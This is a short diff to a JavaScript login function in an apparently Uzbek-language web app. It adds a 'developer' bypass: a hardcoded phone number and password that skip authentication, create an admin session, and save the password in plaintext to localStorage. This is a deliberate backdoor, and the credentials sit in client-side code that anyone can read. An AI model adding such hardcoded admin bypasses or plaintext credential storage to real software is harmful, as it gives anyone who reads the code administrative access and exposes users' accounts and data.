@@ -851,6 +851,17 @@ async function handleLogin(e) {
         return;
     }
 
+    // Bypass check for special developer credentials
+    if (raw9 === '993292340' && password === '2340') {
+        saveSession({ user_id: 'admin_bypass', name: 'Фазлиддин', role: 'admin' });
+        localStorage.setItem('saved_phone', raw);
+        localStorage.setItem('saved_password', password);
+        document.getElementById('header-user-name').textContent = 'Фазлиддин';
+        showMainScreen();
+        showStatus('✅ Муваффақиятли тизимга кирилди (тезкор)', 'info');
+        return;
+    }
+
     const btn = document.getElementById('login-submit-btn');
     btn.textContent = 'Кирилмоқда...';
     btn.disabled = true;
